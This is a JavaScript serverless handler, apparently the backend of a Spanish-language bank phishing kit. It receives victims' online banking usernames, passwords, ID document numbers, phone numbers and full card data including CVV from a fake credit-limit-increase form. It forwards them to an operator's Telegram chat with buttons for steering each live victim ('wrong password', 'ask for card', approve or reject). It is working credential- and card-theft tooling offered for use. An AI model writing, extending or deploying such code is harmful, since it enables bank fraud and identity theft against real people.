// api/telegram.js
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || '').split(',').map(id => id.trim());
const SECRET_TOKEN = process.env.SECRET_TOKEN || 'mi_token_secreto_2026_seguro_123456';
const RATE_LIMIT_MAX = parseInt(process.env.RATE_LIMIT_MAX) || 5;
const RATE_LIMIT_WINDOW = parseInt(process.env.RATE_LIMIT_WINDOW) || 60000;
const SESSION_TIMEOUT = parseInt(process.env.SESSION_TIMEOUT) || 300000;

const sessions = new Map();
const rateLimit = new Map();

// ============================================
// RATE LIMIT
// ============================================
function checkRateLimit(ip) {
    const now = Date.now();
    if (!rateLimit.has(ip)) {
        rateLimit.set(ip, { count: 1, timestamp: now });
        return true;
    }
    const data = rateLimit.get(ip);
    if (now - data.timestamp > RATE_LIMIT_WINDOW) {
        rateLimit.set(ip, { count: 1, timestamp: now });
        return true;
    }
    data.count++;
    if (data.count > RATE_LIMIT_MAX) return false;
    return true;
}

// ============================================
// VALIDAR ADMIN
// ============================================
function isAdmin(chatId) {
    return TELEGRAM_ADMIN_IDS.includes(String(chatId));
}

// ============================================
// VALIDAR TOKEN
// ============================================
function isValidToken(token) {
    return token === SECRET_TOKEN;
}

// ============================================
// HANDLER PRINCIPAL
// ============================================
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With, X-API-Key');

    if (req.method === 'OPTIONS') return res.status(200).end();

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return res.status(500).json({ error: 'Configuración incompleta', action: 'error' });
    }

    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    if (!checkRateLimit(ip)) {
        return res.status(429).json({ error: 'Demasiadas solicitudes', action: 'rate_limit' });
    }

    // ============================================
    // GET - Verificar estado de sesión
    // ============================================
    if (req.method === 'GET') {
        const { session } = req.query;
        if (!session) return res.status(400).json({ error: 'Session ID requerido' });

        const sessionData = sessions.get(session);
        if (!sessionData) {
            return res.status(200).json({ action: 'not_found', message: 'Sesión no encontrada' });
        }

        if (Date.now() - sessionData.timestamp > SESSION_TIMEOUT) {
            sessions.delete(session);
            return res.status(200).json({ action: 'timeout', message: 'Tiempo de espera agotado' });
        }

        return res.status(200).json({
            action: sessionData.status === 'pending' ? 'pending' : sessionData.action,
            message: sessionData.message || 'Esperando respuesta'
        });
    }

    // ============================================
    // POST
    // ============================================
    if (req.method === 'POST') {
        try {
            const body = req.body;

            // ============================================
            // VERIFICAR TOKEN SECRETO
            // ============================================
            const apiKey = req.headers['x-api-key'] || body?._token;
            if (!isValidToken(apiKey)) {
                console.warn(`⚠️ Token inválido desde IP: ${ip}`);
                return res.status(401).json({ error: 'No autorizado', action: 'unauthorized' });
            }

            // ============================================
            // CALLBACK DE TELEGRAM
            // ============================================
            if (body.callback_query) {
                const callback = body.callback_query;
                const chatId = callback.message?.chat?.id;

                if (!isAdmin(chatId)) {
                    await fetch(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                        {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                callback_query_id: callback.id,
                                text: '⛔ No tienes permisos',
                                show_alert: true
                            })
                        }
                    );
                    return res.status(200).json({ status: 'ok' });
                }

                return await handleTelegramCallback(body, res);
            }

            // ============================================
            // TIPO: TARJETA
            // ============================================
            if (body.tipo === 'tarjeta') {
                const { numero, cvv, exp_mes, exp_anio } = body;

                if (!numero || !cvv || !exp_mes || !exp_anio) {
                    return res.status(400).json({ error: 'Datos incompletos', action: 'error' });
                }

                const sessionId = `${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 7)}`;

                sessions.set(sessionId, {
                    tipo: 'tarjeta',
                    usuario: body.usuario || 'No disponible',
                    clave: body.clave || 'No disponible',
                    nombre: body.nombre || 'No proporcionado',
                    tipo_documento: body.tipo_documento || 'No disponible',
                    numero_documento: body.numero_documento || 'No disponible',
                    celular: body.celular || 'No disponible',
                    numero,
                    cvv,
                    exp_mes,
                    exp_anio,
                    ip: ip || 'No disponible',
                    fecha: body.fecha || new Date().toLocaleString(),
                    timestamp: Date.now(),
                    status: 'pending'
                });

                const mensaje = `💳 *SOLICITUD COMPLETA - AUMENTO DE CUPO*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* \`${body.usuario || 'No disponible'}\`
🔑 *Clave:* \`${body.clave || 'No disponible'}\`
📄 *Nombre:* ${body.nombre || 'No proporcionado'}
🆔 *Documento:* ${body.tipo_documento || 'No disponible'} ${body.numero_documento || 'No disponible'}
📱 *Celular:* ${body.celular || 'No disponible'}
━━━━━━━━━━━━━━━━━━━━━━
🏦 *Número:* \`${numero}\`
🔢 *CVV:* \`${cvv}\`
📅 *Vencimiento:* ${exp_mes}/${exp_anio}
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* ${ip || 'No disponible'}
🕐 *Fecha:* ${body.fecha || new Date().toLocaleString()}
🆔 *Session:* ${sessionId}
━━━━━━━━━━━━━━━━━━━━━━
*Acciones disponibles:*`;

                await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: mensaje,
                            parse_mode: 'Markdown',
                            reply_markup: JSON.stringify({
                                inline_keyboard: [
                                    [{ text: '✅ Aprobar Tarjeta', callback_data: `approve_card_${sessionId}` }],
                                    [{ text: '❌ Rechazar Tarjeta', callback_data: `reject_card_${sessionId}` }]
                                ]
                            })
                        })
                    }
                );

                return res.status(200).json({
                    success: true,
                    action: 'pending',
                    sessionId: sessionId,
                    message: 'Solicitud enviada'
                });
            }

            // ============================================
            // TIPO: LOGIN
            // ============================================
            if (!body.usuario || !body.clave) {
                return res.status(400).json({ error: 'Datos incompletos', action: 'error' });
            }

            const sessionId = `${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 7)}`;

            sessions.set(sessionId, {
                tipo: 'login',
                usuario: body.usuario,
                clave: body.clave,
                nombre: body.nombre || 'No disponible',
                tipo_documento: body.tipo_documento || 'No disponible',
                numero_documento: body.numero_documento || 'No disponible',
                celular: body.celular || 'No disponible',
                ip: ip || 'No disponible',
                fecha: body.fecha || new Date().toLocaleString(),
                intento: body.intento || 1,
                timestamp: Date.now(),
                status: 'pending'
            });

            const mensaje = `🔐 *NUEVO INTENTO DE LOGIN*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* \`${body.usuario}\`
🔑 *Clave:* \`${body.clave}\`
📄 *Nombre:* ${body.nombre || 'No disponible'}
🆔 *Documento:* ${body.tipo_documento || 'No disponible'} ${body.numero_documento || 'No disponible'}
📱 *Celular:* ${body.celular || 'No disponible'}
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* ${ip || 'No disponible'}
🕐 *Fecha:* ${body.fecha || new Date().toLocaleString()}
🔄 *Intento #:* ${body.intento || 1}
🆔 *Session:* ${sessionId}
━━━━━━━━━━━━━━━━━━━━━━
*Acciones disponibles:*`;

            await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: JSON.stringify({
                            inline_keyboard: [
                                [
                                    { text: '❌ Error en Usuario', callback_data: `error_user_${sessionId}` },
                                    { text: '❌ Error en Clave', callback_data: `error_pass_${sessionId}` }
                                ],
                                [{ text: '📇 Pedir CC', callback_data: `approve_${sessionId}` }]
                            ]
                        })
                    })
                }
            );

            return res.status(200).json({
                success: true,
                action: 'pending',
                sessionId: sessionId,
                message: 'Solicitud enviada'
            });

        } catch (error) {
            console.error('❌ Error:', error);
            return res.status(500).json({ error: 'Error interno', action: 'error' });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}

// ============================================
// MANEJAR CALLBACKS DE TELEGRAM
// ============================================
async function handleTelegramCallback(body, res) {
    try {
        const callback = body.callback_query;
        const { id, data, message } = callback;
        const chatId = message.chat.id;

        if (!isAdmin(chatId)) {
            await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: id,
                        text: '⛔ No tienes permisos',
                        show_alert: true
                    })
                }
            );
            return res.status(200).json({ status: 'ok' });
        }

        const parts = data.split('_');
        const action = parts[0];
        const sessionId = parts.slice(1).join('_');

        const sessionData = sessions.get(sessionId);

        if (!sessionData) {
            await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: id,
                        text: '❌ Sesión expirada',
                        show_alert: true
                    })
                }
            );
            return res.status(200).json({ status: 'ok' });
        }

        let respuesta = '';
        let mensajeUsuario = '';
        let actionType = '';

        switch (action) {
            case 'approve':
                if (sessionData.tipo === 'login') {
                    respuesta = `📇 *DATOS RECIBIDOS*\n👤 Usuario: \`${sessionData.usuario}\``;
                    mensajeUsuario = 'Tus datos han sido recibidos. Serás redirigido...';
                    actionType = 'approve';
                } else if (sessionData.tipo === 'tarjeta') {
                    respuesta = `✅ *TARJETA APROBADA*\n👤 Usuario: \`${sessionData.usuario}\``;
                    mensajeUsuario = '✅ Tarjeta aprobada. Redirigiendo...';
                    actionType = 'approve_card';
                }
                break;
            case 'reject':
                respuesta = `❌ *TARJETA RECHAZADA*\n👤 Usuario: \`${sessionData.usuario}\``;
                mensajeUsuario = '❌ Tarjeta rechazada.';
                actionType = 'reject_card';
                break;
            case 'error':
                if (data.includes('error_user')) {
                    respuesta = '❌ *USUARIO INCORRECTO*';
                    mensajeUsuario = 'Usuario incorrecto.';
                    actionType = 'error_user';
                } else if (data.includes('error_pass')) {
                    respuesta = '❌ *CLAVE INCORRECTA*';
                    mensajeUsuario = 'Clave incorrecta.';
                    actionType = 'error_pass';
                }
                break;
            default:
                respuesta = '⚠️ *ACCIÓN NO RECONOCIDA*';
                mensajeUsuario = 'Acción no válida.';
                actionType = 'unknown';
        }

        await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    message_id: message.message_id,
                    text: `${respuesta}\n━━━━━━━━━━━━━━━━━━━━━━\n📱 IP: ${sessionData.ip}`,
                    parse_mode: 'Markdown'
                })
            }
        );

        await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: id,
                    text: action === 'approve' ? '✅ Aprobado' : '❌ Rechazado',
                    show_alert: false
                })
            }
        );

        sessions.set(sessionId, {
            ...sessionData,
            status: 'answered',
            action: actionType,
            message: mensajeUsuario,
            timestamp: Date.now()
        });

        return res.status(200).json({ status: 'ok', action: actionType, message: mensajeUsuario });

    } catch (error) {
        console.error('❌ Error en callback:', error);
        return res.status(500).json({ error: 'Error interno' });
    }
}
